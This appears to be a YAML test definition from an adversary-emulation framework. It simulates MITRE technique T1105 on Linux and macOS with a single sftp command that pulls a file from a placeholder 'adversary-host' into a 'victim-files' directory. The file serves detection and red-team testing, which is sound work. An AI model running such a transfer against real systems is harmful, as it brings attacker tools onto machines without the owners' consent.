api_version: "2.0"
name: sftp remote file copy (pull)
description: |
    Utilize sftp to perform a remote file copy (pull)
args:
    - name: username
      type: string
      default: adversary
    - name: remote_host
      type: string
      default: adversary-host
    - name: local_path
      type: path
      default: /tmp/victim-files/
    - name: remote_file
      type: path
      default: /tmp/adversary-sftp
uuid: 0139dba1-f391-405e-a4f5-f3989f2c88ef
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: linux
        - os: darwin
steps:
    - name: sftp-remote-file-copy-(pull)
      inline: |
        sftp {{.Args.username}}@{{.Args.remote_host}}:{{.Args.remote_file}} {{.Args.local_path}}
      executor: sh
      cleanup:
        inline: ""
        executor: sh
